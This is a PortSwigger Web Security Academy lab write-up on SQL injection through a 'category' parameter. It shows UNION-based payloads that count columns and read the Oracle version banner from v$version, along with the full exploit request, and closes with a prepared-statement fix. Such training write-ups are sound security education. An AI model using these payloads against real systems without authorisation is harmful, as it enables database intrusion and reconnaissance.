# PortSwigger Lab Write-up – SQL Injection (Database Version)

## 🧪 Lab

**SQL Injection – Determine Database Version**

Platform: PortSwigger Web Security Academy

---

## 🧠 Vulnerability

**SQL Injection**

The application does not properly sanitize user input. The `category` parameter is directly concatenated into the SQL query.

Example vulnerable request:

```
GET /filter?category=Pets HTTP/2
Host: lab-id.web-security-academy.net
```

Possible backend query:

```
SELECT name, description
FROM products
WHERE category = 'Pets'
```

Because user input is inserted directly into the query, the application is vulnerable to SQL Injection.

---

## 🎯 Goal

Identify the database version used by the application.

---

## 🔍 Exploitation

First, determine the number of columns returned by the query.

Payload used:

```
' UNION SELECT NULL,NULL--
```

Once the column count was confirmed, the following payload was used to retrieve the database version from Oracle:

```
' UNION SELECT banner,NULL FROM v$version--
```

Final exploit request:

```
GET /filter?category='+UNION+SELECT+banner,+NULL+FROM+v$version+-- HTTP/2
Host: lab-id.web-security-academy.net
Cookie: session=YOUR_SESSION
User-Agent: Mozilla/5.0
```

---

## 📊 Result

The response displayed the database version.

Example output:

```
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0
```

This confirms that the backend database is **Oracle**.

---

## 🛡 Root Cause

* User input is not sanitized
* No use of prepared statements
* Lack of input validation

---

## 🔒 Mitigation / Fix

### Use Prepared Statements

Example (PHP PDO):

```
$stmt = $pdo->prepare("SELECT name, description FROM products WHERE category = ?");
$stmt->execute([$category]);
```

### Input Validation

Only allow predefined category values.

### Use ORM or Query Builder

Avoid constructing raw SQL queries with user input.

---

## 🧰 Tools Used

* Burp Suite
* Firefox
* PortSwigger Web Security Academy

---

## 📚 References

* OWASP Top 10 – SQL Injection
* PortSwigger Web Security Academy
